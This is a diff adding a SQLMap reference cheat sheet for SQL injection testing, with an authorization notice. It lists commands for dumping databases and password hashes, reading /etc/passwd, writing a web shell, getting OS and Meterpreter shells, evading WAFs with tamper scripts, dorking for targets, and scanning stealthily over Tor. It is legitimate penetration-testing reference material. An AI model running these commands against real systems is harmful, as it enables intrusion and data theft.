@@ -1,4 +1,446 @@
 
+# SQLMap Reference Guide ..beta..
+
+**Important Notice**: This tool should only be used for authorized security testing on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal.
+
+## Basic Usage
+
+### Database Enumeration
+
+```bash
+# List all databases
+sqlmap -u "$URL" --dbs
+
+# Get current database
+sqlmap -u "$URL" --current-db
+
+# List tables in a database
+sqlmap -u "$URL" -D "$DATABASE" --tables
+
+# List columns in a table
+sqlmap -u "$URL" -D "$DATABASE" -T "$TABLE" --columns
+
+# Dump table data
+sqlmap -u "$URL" -D "$DATABASE" -T "$TABLE" --dump
+
+# Dump specific columns
+sqlmap -u "$URL" -D "$DATABASE" -T "$TABLE" -C "column1,column2" --dump
+
+# Dump all databases (exclude system DBs)
+sqlmap -u "$URL" --dump-all --exclude-sysdbs
+```
+
+## Target Options
+
+### URL and Parameter Specification
+
+```bash
+# Basic URL target
+sqlmap -u "http://example.com/page?id=1"
+
+# Specify parameter to test
+sqlmap -u "http://example.com/page?id=1&name=test" -p id
+
+# Test all parameters
+sqlmap -u "http://example.com/page?id=1&name=test" --level=5 --risk=3
+
+# RESTful URL testing
+sqlmap -u "http://example.com/param1/value1*/param2/value2"
+
+# Parse forms automatically
+sqlmap -u "http://example.com/login.php" --forms --batch
+```
+
+### POST Requests
+
+```bash
+# POST data
+sqlmap -u "http://example.com/login.php" --data "username=admin&password=pass"
+
+# POST with method specification
+sqlmap -u "http://example.com/search.php" --method POST --data "q=test"
+
+# JSON POST data
+sqlmap -u "http://example.com/api" --data='{"id":"1"}' --headers="Content-Type: application/json"
+```
+
+### Headers and Cookies
+
+```bash
+# Cookie-based injection
+sqlmap -u "http://example.com" --cookie="session=abc123; user=admin"
+
+# Custom headers
+sqlmap -u "http://example.com" --headers="X-Forwarded-For: 127.0.0.1"
+
+# Custom User-Agent
+sqlmap -u "http://example.com" --user-agent="Custom Agent"
+
+# Random User-Agent
+sqlmap -u "http://example.com" --random-agent
+
+# HTTP authentication
+sqlmap -u "http://example.com" --auth-type=Basic --auth-cred="user:pass"
+```
+
+## Enumeration Options
+
+### User and Privilege Information
+
+```bash
+# Current user
+sqlmap -u "$URL" --current-user
+
+# List database users
+sqlmap -u "$URL" --users
+
+# Enumerate passwords
+sqlmap -u "$URL" --passwords
+
+# Check if DBA
+sqlmap -u "$URL" --is-dba
+
+# User privileges
+sqlmap -u "$URL" --privileges
+
+# User roles
+sqlmap -u "$URL" --roles
+```
+
+### Database Fingerprinting
+
+```bash
+# Banner grabbing
+sqlmap -u "$URL" --banner
+
+# Fingerprint DBMS
+sqlmap -u "$URL" --fingerprint
+
+# Force DBMS type
+sqlmap -u "$URL" --dbms=MySQL
+
+# Detect DBMS and OS
+sqlmap -u "$URL" -b
+```
+
+## Advanced Techniques
+
+### Injection Techniques
+
+```bash
+# Specify injection technique
+# B: Boolean-based blind
+# E: Error-based
+# U: Union query-based
+# S: Stacked queries
+# T: Time-based blind
+sqlmap -u "$URL" --technique=BEUST
+
+# Time-delay configuration
+sqlmap -u "$URL" --technique=T --time-sec=10
+
+# Union-based testing
+sqlmap -u "$URL" --union-cols=5 --union-char='a'
+```
+
+### Performance Optimization
+
+```bash
+# Multi-threading
+sqlmap -u "$URL" --threads=10
+
+# Keep-alive connections
+sqlmap -u "$URL" --keep-alive
+
+# NULL connection (faster)
+sqlmap -u "$URL" --null-connection
+
+# All optimizations
+sqlmap -u "$URL" -o
+
+# Predict common outputs
+sqlmap -u "$URL" --predict-output
+```
+
+### Detection and Bypass
+
+```bash
+# Set detection level (1-5)
+sqlmap -u "$URL" --level=3
+
+# Set risk level (1-3)
+sqlmap -u "$URL" --risk=2
+
+# WAF/IPS bypass with tamper scripts
+sqlmap -u "$URL" --tamper=space2comment
+
+# Multiple tamper scripts
+sqlmap -u "$URL" --tamper=between,randomcase
+
+# Custom prefix/suffix
+sqlmap -u "$URL" --prefix="'))" --suffix="--"
+
+# Test string matching
+sqlmap -u "$URL" --string="Welcome"
+```
+
+### Popular Tamper Scripts
+
+```bash
+# Common tamper scripts for WAF bypass:
+--tamper=space2comment          # Replace space with /**/
+--tamper=between                # Replace > with NOT BETWEEN 0 AND #
+--tamper=charencode             # URL encode characters
+--tamper=randomcase             # Random case
+--tamper=equaltolike            # Replace = with LIKE
+--tamper=apostrophemask         # Replace apostrophe with UTF-8
+--tamper=base64encode           # Base64 encode
+--tamper=space2hash             # Replace space with # and newline
+```
+
+## File System Access
+
+```bash
+# Read file from server
+sqlmap -u "$URL" --file-read="/etc/passwd"
+
+# Write file to server
+sqlmap -u "$URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+```
+
+## Operating System Access
+
+```bash
+# Get OS shell
+sqlmap -u "$URL" --os-shell
+
+# Get SQL shell
+sqlmap -u "$URL" --sql-shell
+
+# Execute OS command
+sqlmap -u "$URL" --os-cmd="whoami"
+
+# Execute SQL query
+sqlmap -u "$URL" --sql-query="SELECT version()"
+
+# Meterpreter shell
+sqlmap -u "$URL" --os-pwn --msf-path="/path/to/metasploit"
+```
+
+## Proxy and Anonymity
+
+```bash
+# HTTP proxy
+sqlmap -u "$URL" --proxy="http://127.0.0.1:8080"
+
+# SOCKS proxy
+sqlmap -u "$URL" --proxy="socks5://127.0.0.1:9050"
+
+# Tor usage
+sqlmap -u "$URL" --tor --tor-type=SOCKS5 --check-tor
+
+# Ignore system proxy
+sqlmap -u "$URL" --ignore-proxy
+
+# Proxy authentication
+sqlmap -u "$URL" --proxy="http://proxy.com:8080" --proxy-cred="user:pass"
+```
+
+## Session Management
+
+```bash
+# Save session
+sqlmap -u "$URL" -s "session.sqlite"
+
+# Resume session
+sqlmap -u "$URL" -s "session.sqlite" --resume
+
+# Flush session
+sqlmap -u "$URL" --flush-session
+
+# Fresh queries (ignore cached)
+sqlmap -u "$URL" --fresh-queries
+```
+
+## Request Manipulation
+
+```bash
+# Request delay (seconds)
+sqlmap -u "$URL" --delay=2
+
+# Timeout
+sqlmap -u "$URL" --timeout=10
+
+# Retries
+sqlmap -u "$URL" --retries=3
+
+# Randomize parameters
+sqlmap -u "$URL" --randomize=param
+
+# Safe URL (visit frequently)
+sqlmap -u "$URL" --safe-url="http://example.com/safe" --safe-freq=3
+```
+
+## Brute Force
+
+```bash
+# Common tables
+sqlmap -u "$URL" --common-tables
+
+# Common columns
+sqlmap -u "$URL" --common-columns
+
+# Custom wordlist
+sqlmap -u "$URL" -D testdb --tables --common-tables
+```
+
+## Output Options
+
+```bash
+# Verbosity level (0-6)
+sqlmap -u "$URL" -v 3
+
+# Log to file
+sqlmap -u "$URL" -t "traffic.txt"
+
+# Batch mode (no prompts)
+sqlmap -u "$URL" --batch
+
+# Answer yes to all
+sqlmap -u "$URL" --answers="extending=N,follow=N"
+
+# Beep on detection
+sqlmap -u "$URL" --beep
+
+# Show ETA
+sqlmap -u "$URL" --eta
+```
+
+## Crawling and Automation
+
+```bash
+# Crawl website
+sqlmap -u "http://example.com" --crawl=3
+
+# Google dorking
+sqlmap -g "inurl:'.php?id='" --batch --random-agent
+
+# Parse sitemap
+sqlmap -u "http://example.com" --crawl=2 --crawl-exclude="logout"
+
+# Forms parsing
+sqlmap -u "http://example.com" --forms --batch --crawl=2
+```
+
+## Configuration
+
+```bash
+# Load config from file
+sqlmap -c "config.ini"
+
+# Save options to config
+sqlmap -u "$URL" --save="config.ini"
+
+# Update SQLMap
+sqlmap --update
+
+# Wizard mode (interactive)
+sqlmap --wizard
+```
+
+## Example Workflows
+
+### Quick Scan
+
+```bash
+sqlmap -u "http://example.com/page?id=1" \
+  --batch \
+  --random-agent \
+  --level=1 \
+  --risk=1 \
+  --dbs
+```
+
+### Thorough Scan
+
+```bash
+sqlmap -u "http://example.com/page?id=1" \
+  --batch \
+  --random-agent \
+  --level=5 \
+  --risk=3 \
+  --threads=10 \
+  --dbms=MySQL \
+  --tamper=space2comment \
+  --dbs \
+  --dump-all \
+  --exclude-sysdbs
+```
+
+### Stealth Scan
+
+```bash
+sqlmap -u "http://example.com/page?id=1" \
+  --tor \
+  --tor-type=SOCKS5 \
+  --check-tor \
+  --random-agent \
+  --delay=3 \
+  --technique=T \
+  --dbs
+```
+
+### POST Form Testing
+
+```bash
+sqlmap -u "http://example.com/login.php" \
+  --forms \
+  --batch \
+  --crawl=2 \
+  --level=3 \
+  --risk=2 \
+  --random-agent \
+  --dbs
+```
+
+## Best Practices
+
+1. **Always get authorization** before testing any system
+2. **Start with low risk/level** and increase if needed
+3. **Use `--batch`** for automated scans
+4. **Save sessions** for large scans you can resume
+5. **Use tamper scripts** when facing WAF/IPS
+6. **Enable verbose mode** (`-v`) for debugging
+7. **Specify DBMS** if known to speed up testing
+8. **Use threading** carefully to avoid detection/DoS
+9. **Log all traffic** for documentation (`-t`)
+10. **Consider stealth** with Tor and delays when needed
+
+## Common Error Solutions
+
+### "Connection timeout"
+```bash
+# Increase timeout and retries
+sqlmap -u "$URL" --timeout=30 --retries=5
+```
+
+### "WAF detected"
+```bash
+# Use tamper scripts and random agent
+sqlmap -u "$URL" --tamper=space2comment --random-agent --delay=2
+```
+
+### "No injection found"
+```bash
+# Increase level and risk
+sqlmap -u "$URL" --level=5 --risk=3 --technique=BEUST
+```
+
+---
+
+##
+##
+
 # Enumerate databases
 sqlmap --dbms=mysql -u "$URL" --dbs
 
